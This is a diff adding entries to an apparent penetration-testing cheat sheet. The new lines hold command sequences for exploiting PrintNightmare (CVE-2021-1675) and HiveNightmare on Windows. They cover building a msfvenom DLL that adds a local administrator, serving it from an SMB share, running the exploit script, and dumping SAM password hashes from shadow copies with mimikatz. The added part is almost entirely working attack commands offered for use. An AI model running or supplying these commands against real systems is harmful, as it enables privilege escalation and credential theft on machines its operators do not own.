@@ -994,6 +994,20 @@ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-user
 [print nightmare]
 >> check if vulnerable
 rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR
+>> Generate msfvenom payload
+msfvenom -p windows/x64/exec CMD="net.exe localgroup administrators testuser /add" -f dll -o test.dll
+>> setup smbserver
+smbserver.py smbshare `pwd` -smb2support
+>> Run the following command
+python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
+
+[Hive Nightmare]
+>> Check if system is vulnerable with the following commands
+icacls C:\Windows\System32\config\SAM
+>> check if shadow copy is available
+vssadmin list shadows
+>> use mimikatz or secretsdump
+mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 
 [smb change password]
 smbpasswd -U bhult -r 10.10.10.193
